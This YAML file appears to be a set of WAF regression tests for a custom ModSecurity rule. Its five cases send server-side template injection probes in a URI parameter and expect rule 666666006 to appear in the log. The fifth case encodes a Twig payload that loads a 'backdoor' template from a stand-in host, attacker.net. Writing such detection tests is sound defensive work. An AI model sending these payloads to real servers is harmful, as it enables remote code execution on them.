---
meta:
  author: "ngoctin"
  enabled: true
  name: "template-injection.yaml"
  description: "Polaris Custom rules test"
tests:
  - test_title: "Server side template injection in URI 1"
    stages:
      - stage:
          input:
            dest_addr: "localhost"
            method: "GET"
            port: 80
            headers:
              Host: "localhost"
              User-Agent: "ModSecurity CRS 3 Tests"
            uri: "/?param=%3C%25%3D+1%2A1%25%3E" # urlencode("<%= 1*1%>")
          output:
            log_contains: 'id "666666006"'
  - test_title: "Server side template injection in URI 2"
    stages:
      - stage:
          input:
            dest_addr: "localhost"
            method: "GET"
            port: 80
            headers:
              Host: "localhost"
              User-Agent: "ModSecurity CRS 3 Tests"
            uri: "/?param=%23%7B+1%2A1%7D" # urlencode("#{ 1*1}")
          output:
            log_contains: 'id "666666006"'
  - test_title: "Server side template injection in URI 3"
    stages:
      - stage:
          input:
            dest_addr: "localhost"
            method: "GET"
            port: 80
            headers:
              Host: "localhost"
              User-Agent: "ModSecurity CRS 3 Tests"
            uri: "/?param=${class.getResource(\"\").getPath()}"
          output:
            log_contains: 'id "666666006"'
  - test_title: "Server side template injection in URI 4"
    stages:
      - stage:
          input:
            dest_addr: "localhost"
            method: "GET"
            port: 80
            headers:
              Host: "localhost"
              User-Agent: "ModSecurity CRS 3 Tests"
            uri: "/?param=${{7*7}}"
          output:
            log_contains: 'id "666666006"'
  - test_title: "Server side template injection in URI 5"
    stages:
      - stage:
          input:
            dest_addr: "localhost"
            method: "GET"
            port: 80
            headers:
              Host: "localhost"
              User-Agent: "ModSecurity CRS 3 Tests"
            uri: "/?param=%7B%7B_self.env.setCache%28%22ftp%3A%2F%2Fattacker.net%3A2121%22%29%7D%7D%7B%7B_self.env.loadTemplate%28%22backdoor%22%29%7D%7D" # urlencode("{{_self.env.setCache(\"ftp://attacker.net:2121\")}}{{_self.env.loadTemplate(\"backdoor\")}}")
          output:
            log_contains: 'id "666666006"'